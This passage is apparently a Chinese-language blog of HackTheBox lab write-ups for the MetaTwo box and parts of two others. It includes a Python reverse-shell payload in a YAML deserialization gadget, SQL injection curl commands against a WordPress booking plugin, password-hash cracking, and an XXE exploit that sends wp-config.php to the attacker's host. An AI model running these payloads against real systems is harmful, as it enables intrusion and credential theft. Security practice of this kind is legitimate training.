os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;10.10.*.*&#x27;,9997));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);\&quot;&quot;</span></span><br><span class="line">         <span class="attr">method_id:</span> <span class="string">:resolve</span></span><br></pre></td></tr></table></figure>
<p>监听端口</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9997</span><br></pre></td></tr></table></figure>
<p>触发反序列化漏洞</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/ruby /opt/update_dependencies.rb</span><br></pre></td></tr></table></figure>
<p>获得root权限，查看flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br><span class="line">a6c3884ed3b917b870834758ab46f9f1</span><br></pre></td></tr></table></figure>
<hr />
<h1 id="hackthebox_metatwo"><a class="markdownIt-Anchor" href="#hackthebox_metatwo"></a> HackTheBox_MetaTwo</h1>
<h2 id="信息收集-4"><a class="markdownIt-Anchor" href="#信息收集-4"></a> 信息收集</h2>
<h3 id="端口扫描-21"><a class="markdownIt-Anchor" href="#端口扫描-21"></a> 端口扫描</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -T5 -v 10.10.11.186</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.186</span><br><span class="line">Host is up (1.1s latency).</span><br><span class="line">Not shown: 828 closed ports, 169 filtered ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21&#x2F;tcp open  ftp</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">80&#x2F;tcp open  http    nginx 1.18.0</span><br><span class="line">1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :</span><br><span class="line">SF-Port21-TCP:V&#x3D;7.70%I&#x3D;7%D&#x3D;3&#x2F;2%Time&#x3D;64009A16%P&#x3D;x86_64-pc-linux-gnu%r(Gener</span><br><span class="line">SF:icLines,8F,&quot;220\x20ProFTPD\x20Server\x20\(Debian\)\x20\[::ffff:10\.10\.</span><br><span class="line">SF:11\.186\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20crea</span><br><span class="line">SF:tive\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative\</span><br><span class="line">SF:r\n&quot;);</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
<h3 id="路径枚举-2"><a class="markdownIt-Anchor" href="#路径枚举-2"></a> 路径枚举</h3>
<p>请求WEB页面</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 10.10.11.186 -I</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 302 Moved Temporarily</span><br><span class="line">Server: nginx&#x2F;1.18.0</span><br><span class="line">Date: Thu, 02 Mar 2023 12:39:11 GMT</span><br><span class="line">Content-Type: text&#x2F;html</span><br><span class="line">Content-Length: 145</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Location: http:&#x2F;&#x2F;metapress.htb&#x2F;</span><br></pre></td></tr></table></figure>
<p>跳转至域名<code>metapress.htb</code></p>
<p>添加域名解析</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.186\tmetapress.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
<p>访问页面是个Wordpress，没必要枚举了</p>
<h2 id="漏洞利用-19"><a class="markdownIt-Anchor" href="#漏洞利用-19"></a> 漏洞利用</h2>
<p>枚举用户名</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url <span class="string">&quot;http://metapress.htb/&quot;</span> -e u</span><br></pre></td></tr></table></figure>
<p>部分信息如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[+] robots.txt found: http:&#x2F;&#x2F;metapress.htb&#x2F;robots.txt</span><br><span class="line"> | Interesting Entries:</span><br><span class="line"> |  - &#x2F;wp-admin&#x2F;</span><br><span class="line"> |  - &#x2F;wp-admin&#x2F;admin-ajax.php</span><br><span class="line"> | Found By: Robots Txt (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line"> [+] WordPress version 5.6.2 identified (Insecure, released on 2021-02-22).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http:&#x2F;&#x2F;metapress.htb&#x2F;feed&#x2F;, &lt;generator&gt;https:&#x2F;&#x2F;wordpress.org&#x2F;?v&#x3D;5.6.2&lt;&#x2F;generator&gt;</span><br><span class="line"> |  - http:&#x2F;&#x2F;metapress.htb&#x2F;comments&#x2F;feed&#x2F;, &lt;generator&gt;https:&#x2F;&#x2F;wordpress.org&#x2F;?v&#x3D;5.6.2&lt;&#x2F;generator&gt;</span><br><span class="line"></span><br><span class="line"> [+] admin</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Rss Generator (Passive Detection)</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http:&#x2F;&#x2F;metapress.htb&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1</span><br><span class="line"> |  Rss Generator (Aggressive Detection)</span><br><span class="line"> |  Author Sitemap (Aggressive Detection)</span><br><span class="line"> |   - http:&#x2F;&#x2F;metapress.htb&#x2F;wp-sitemap-users-1.xml</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] manager</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure>
<p>访问页面<code>http://metapress.htb/events/</code></p>
<p>在HTML代码中找到以下内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;metapress.htb&#x2F;wp-content&#x2F;plugins&#x2F;bookingpress-appointment-booking&#x2F;css&#x2F;bookingpress_element_theme.css?ver&#x3D;1.0.10</span><br></pre></td></tr></table></figure>
<p>确定该插件为 <code>bookingpress-appointment-booking 1.0.10</code></p>
<p>google得到相关漏洞</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357">https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357</a></p>
</blockquote>
<p>源代码中搜索<code>action:'bookingpress_front_get_category_services'</code></p>
<p>得到_wpnonce=7ea553b73c</p>
<p>进行手工SQL注入</p>
<p>查库</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i <span class="string">&#x27;http://metapress.htb/wp-admin/admin-ajax.php&#x27;</span> --data <span class="string">&#x27;action=bookingpress_front_get_category_services&amp;_wpnonce=7ea553b73c&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT -2,-1,0,1,2,3,4,5,group_concat(schema_name) from information_schema.schemata-- -&#x27;</span></span><br></pre></td></tr></table></figure>
<p>库名如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">information_schema</span><br><span class="line">blog</span><br></pre></td></tr></table></figure>
<p>查表</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i <span class="string">&#x27;http://metapress.htb/wp-admin/admin-ajax.php&#x27;</span> --data <span class="string">&#x27;action=bookingpress_front_get_category_services&amp;_wpnonce=7ea553b73c&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT -2,-1,0,1,2,3,4,5,group_concat(table_name) from information_schema.tables where table_schema=0x626c6f67-- -&#x27;</span></span><br></pre></td></tr></table></figure>
<p>blog库表名如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">wp_options</span><br><span class="line">wp_term_taxonomy</span><br><span class="line">wp_bookingpress_servicesmeta</span><br><span class="line">wp_commentmeta</span><br><span class="line">wp_users</span><br><span class="line">wp_bookingpress_customers_meta</span><br><span class="line">wp_bookingpress_settings</span><br><span class="line">wp_bookingpress_appointment_bookings</span><br><span class="line">wp_bookingpress_customize_settings</span><br><span class="line">wp_bookingpress_debug_payment_log</span><br><span class="line">wp_bookingpress_services</span><br><span class="line">wp_termmeta</span><br><span class="line">wp_links</span><br><span class="line">wp_bookingpress_entries</span><br><span class="line">wp_bookingpress_categories</span><br><span class="line">wp_bookingpress_customers</span><br><span class="line">wp_bookingpress_notifications</span><br><span class="line">wp_usermeta</span><br><span class="line">wp_terms</span><br><span class="line">wp_bookingpress_default_daysoff</span><br><span class="line">wp_comments</span><br><span class="line">wp_bookingpress_default_workhours</span><br><span class="line">wp_postmeta</span><br><span class="line">wp_bookingpress_form_fields</span><br><span class="line">wp_bookingpress_payment_logs</span><br><span class="line">wp_posts</span><br><span class="line">wp_term_relationships</span><br></pre></td></tr></table></figure>
<p>查列</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i <span class="string">&#x27;http://metapress.htb/wp-admin/admin-ajax.php&#x27;</span> --data <span class="string">&#x27;action=bookingpress_front_get_category_services&amp;_wpnonce=7ea553b73c&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT -2,-1,0,1,2,3,4,5,group_concat(column_name) from information_schema.columns where table_schema=0x626c6f67 and table_name=0x77705f7573657273-- -&#x27;</span></span><br></pre></td></tr></table></figure>
<p>blog库wp_users表列名如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ID</span><br><span class="line">user_login</span><br><span class="line">user_pass</span><br><span class="line">user_nicename</span><br><span class="line">user_email</span><br><span class="line">user_url</span><br><span class="line">user_registered</span><br><span class="line">user_activation_key</span><br><span class="line">user_status</span><br><span class="line">display_name</span><br></pre></td></tr></table></figure>
<p>查账户信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i <span class="string">&#x27;http://metapress.htb/wp-admin/admin-ajax.php&#x27;</span> --data <span class="string">&#x27;action=bookingpress_front_get_category_services&amp;_wpnonce=7ea553b73c&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT -2,-1,0,1,2,3,4,group_concat(user_login),group_concat(user_pass) from blog.wp_users-- -&#x27;</span></span><br></pre></td></tr></table></figure>
<p>用户名与密码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.</span><br><span class="line">manager:$P$B4aNM28N0E.tMy&#x2F;JIcnVMZbGcU16Q70</span><br></pre></td></tr></table></figure>
<p><strong>读出来的json里面，&quot;/“会被转义为”\/&quot;</strong></p>
<p>hashcat爆破</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.\n$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70&#x27;</span> &gt; <span class="built_in">hash</span></span><br><span class="line">hashcat -m 400 ./<span class="built_in">hash</span> /usr/share/wordlist/rockyou.txt</span><br></pre></td></tr></table></figure>
<p>得到manager的账户信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">manager:partylikearockstar</span><br></pre></td></tr></table></figure>
<p>根据之前wpscan的结果，可以找到wordpress 5.6.2 XXE漏洞</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5">https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5</a><br />
<a target="_blank" rel="noopener" href="https://www.sonarsource.com/blog/wordpress-xxe-security-vulnerability/">https://www.sonarsource.com/blog/wordpress-xxe-security-vulnerability/</a><br />
<a target="_blank" rel="noopener" href="https://github.com/motikan2010/CVE-2021-29447">https://github.com/motikan2010/CVE-2021-29447</a></p>
</blockquote>
<p>这个漏洞需要认证，即用户登陆状态才能出发</p>
<p>构造wav文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -en <span class="string">&#x27;RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM &#x27;</span><span class="string">&quot;&#x27;&quot;</span><span class="string">&#x27;http://10.10.*.*/xxe.dtd&#x27;</span><span class="string">&quot;&#x27;&quot;</span><span class="string">&#x27;&gt;%remote;%param1;%exfil;] &gt;\x00&#x27;</span>&gt; malicious.wav</span><br></pre></td></tr></table></figure>
<p>构造xxe.dtd文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % data SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;zlib.deflate&#x2F;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;wp-config.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % param1 &quot;&lt;!ENTITY &amp;#37; exfil SYSTEM &#39;http:&#x2F;&#x2F;10.10.*.*&#x2F;?%data;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>媒体库中上传wav文件即可出发XXE漏洞</p>
<p>得到FTP账户信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">metapress.htb:9NYS_ii@FyL_p5M2NvJ</span><br></pre></td></tr></table></figure>
<p>登录FTP并获取文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ftp 10.10.11.186</span><br><span class="line">metapress.htb</span><br><span class="line">9NYS_ii@FyL_p5M2NvJ</span><br><span class="line"><span class="built_in">cd</span> mailer</span><br><span class="line">get send_email.php</span><br></pre></td></tr></table></figure>
<p>得到以下账户信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jnelson@metapress.htb:Cb4_JmWM8zUZWMu@Ys</span><br></pre></td></tr></table></figure>
<p>尝试用于登录SSH</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh jnelson@10.10.11.186</span><br><span class="line">Cb4_JmWM8zUZWMu@Ys</span><br></pre></td></tr></table></figure>
<p>登陆成功</p>
<p>获取user.txt</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /home/jnelson/user.txt </span><br><span class="line">1d67d6f8d41d206a8fb29e4570a4b6e2</span><br></pre></td></tr></table></figure>
<h2 id="权限提升-20"><a class="markdownIt-Anchor" href="#权限提升-20"></a> 权限提升</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/jnelson/password </span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">credentials:</span><br><span class="line">- comment: <span class="string">&#x27;&#x27;</span></span><br><span class="line">  fullname: root@ssh</span><br><span class="line">  login: root</span><br><span class="line">  modified: 2022-06-26 08:58:15.621572</span><br><span class="line">  name: ssh</span><br><span class="line">  password: !!python/unicode <span class="string">&#x27;p7qfAZt4_A1xo_0x&#x27;</span></span><br><span class="line">- comment: <span class="string">&#x27;&#x27;</span></span><br><span class="line">  fullname: jnelson@ssh</span><br><span class="line">  login: jnelson</span><br><span class="line">  modified: 2022-06-26 08:58:15.514422</span><br><span class="line">  name: ssh</span><br><span class="line">  password: !!python/unicode <span class="string">&#x27;Cb4_JmWM8zUZWMu@Ys&#x27;</span></span><br><span class="line">handler: passpie</span><br><span class="line">version: 1.0</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br><span class="line">p7qfAZt4_A1xo_0x</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt </span><br><span class="line">686e0b48d30c2092e9ecc70f97a0086f</span><br></pre></td></tr></table></figure>
<hr />
<p>Easiest privilege escalation ever.</p>
<hr />
<h1 id="hackthebox_soccer"><a class="markdownIt-Anchor" href="#hackthebox_soccer"></a> HackTheBox_Soccer</h1>
<h2 id="信息收集-5"><a class="markdownIt-Anchor" href="#信息收集-5"></a> 信息收集</h2>
<h3 id="端口扫描-22"><a class="markdownIt-Anchor" href="#端口扫描-22"></a> 端口扫描</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -T5 -v 10.10.11.194</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.194</span><br><span class="line">Host is up (0.52s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE         VERSION</span><br><span class="line">22&#x2F;tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80&#x2F;tcp   open  http            nginx 1.18.0 (Ubuntu)</span><br><span class="line">9091&#x2F;tcp open  xmltec-xmlmail?</span><br><span class="line">1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :</span><br><span class="line">SF-Port9091-TCP:V&#x3D;7.70%I&#x3D;7%D&#x3D;3&#x2F;5%Time&#x3D;640459F7%P&#x3D;x86_64-pc-linux-gnu%r(inf</span><br><span class="line">SF:ormix,2F,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\</span><br><span class="line">SF:n\r\n&quot;)%r(drda,2F,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Request\r\nConnection:\x2</span><br><span class="line">SF:0close\r\n\r\n&quot;)%r(GetRequest,168,&quot;HTTP&#x2F;1\.1\x20404\x20Not\x20Found\r\n</span><br><span class="line">SF:Content-Security-Policy:\x20default-src\x20&#39;none&#39;\r\nX-Content-Type-Opt</span><br><span class="line">SF:ions:\x20nosniff\r\nContent-Type:\x20text&#x2F;html;\x20charset&#x3D;utf-8\r\nCon</span><br><span class="line">SF:tent-Length:\x20139\r\nDate:\x20Sun,\x2005\x20Mar\x202023\x2008:52:25\x</span><br><span class="line">SF:20GMT\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang&#x3D;</span><br><span class="line">SF:\&quot;en\&quot;&gt;\n&lt;head&gt;\n&lt;meta\x20charset&#x3D;\&quot;utf-8\&quot;&gt;\n&lt;title&gt;Error&lt;&#x2F;title&gt;\n&lt;&#x2F;h</span><br><span class="line">SF:ead&gt;\n&lt;body&gt;\n&lt;pre&gt;Cannot\x20GET\x20&#x2F;&lt;&#x2F;pre&gt;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n&quot;)%r(HTT</span><br><span class="line">SF:POptions,16C,&quot;HTTP&#x2F;1\.1\x20404\x20Not\x20Found\r\nContent-Security-Poli</span><br><span class="line">SF:cy:\x20default-src\x20&#39;none&#39;\r\nX-Content-Type-Options:\x20nosniff\r\nC</span><br><span class="line">SF:ontent-Type:\x20text&#x2F;html;\x20charset&#x3D;utf-8\r\nContent-Length:\x20143\r</span><br><span class="line">SF:\nDate:\x20Sun,\x2005\x20Mar\x202023\x2008:52:25\x20GMT\r\nConnection:\</span><br><span class="line">SF:x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang&#x3D;\&quot;en\&quot;&gt;\n&lt;head&gt;\n&lt;met</span><br><span class="line">SF:a\x20charset&#x3D;\&quot;utf-8\&quot;&gt;\n&lt;title&gt;Error&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n&lt;pre&gt;Ca</span><br><span class="line">SF:nnot\x20OPTIONS\x20&#x2F;&lt;&#x2F;pre&gt;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n&quot;)%r(RTSPRequest,16C,&quot;HTT</span><br><span class="line">SF:P&#x2F;1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20default-sr</span><br><span class="line">SF:c\x20&#39;none&#39;\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x20t</span><br><span class="line">SF:ext&#x2F;html;\x20charset&#x3D;utf-8\r\nContent-Length:\x20143\r\nDate:\x20Sun,\x</span><br><span class="line">SF:2005\x20Mar\x202023\x2008:52:26\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;</span><br><span class="line">SF:!DOCTYPE\x20html&gt;\n&lt;html\x20lang&#x3D;\&quot;en\&quot;&gt;\n&lt;head&gt;\n&lt;meta\x20charset&#x3D;\&quot;ut</span><br><span class="line">SF:f-8\&quot;&gt;\n&lt;title&gt;Error&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n&lt;pre&gt;Cannot\x20OPTIONS\x</span><br><span class="line">SF:20&#x2F;&lt;&#x2F;pre&gt;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n&quot;)%r(RPCCheck,2F,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\</span><br><span class="line">SF:x20Request\r\nConnection:\x20close\r\n\r\n&quot;)%r(DNSVersionBindReqTCP,2F,</span><br><span class="line">SF:&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n&quot;)%r</span><br><span class="line">SF:(DNSStatusRequestTCP,2F,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Request\r\nConnecti</span><br><span class="line">SF:on:\x20close\r\n\r\n&quot;)%r(Help,2F,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Request\r\</span><br><span class="line">SF:nConnection:\x20close\r\n\r\n&quot;)%r(SSLSessionReq,2F,&quot;HTTP&#x2F;1\.1\x20400\x2</span><br><span class="line">SF:0Bad\x20Request\r\nConnection:\x20close\r\n\r\n&quot;);</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
<h3 id="路径枚举-3"><a class="markdownIt-Anchor" href="#路径枚举-3"></a> 路径枚举</h3>
<p>请求WEB页面</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -I 10.10.11.194</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Server: nginx&#x2F;1.18.0 (Ubuntu)</span><br><span class="line">Date: Sun, 05 Mar 2023 08:54:10 GMT</span><br><span class="line">Content-Type: text&#x2F;html</span><br><span class="line">Content-Length: 178</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Location: http:&#x2F;&#x2F;soccer.htb&#x2F;</span><br></pre></td></tr></table></figure>
<p>跳转至域名<code>soccer.htb</code></p>
<p>添加域名解析</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;10.10.11.194\tsoccer.htb&#x27;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
<p>枚举路径</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://soccer.htb/ /usr/share/wordlists/SecLists-master/Discovery/Web-Content/SVNDigger/all-dirs.txt -w</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;soccer.htb&#x2F;tiny&#x2F;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a></p>
</blockquote>
<h2 id="漏洞利用-20"><a class="markdownIt-Anchor" href="#漏洞利用-20"></a> 漏洞利用</h2>
<p>访问页面<code>http://soccer.htb/tiny/</code></p>
<p>源代码中存在以下内容</p>
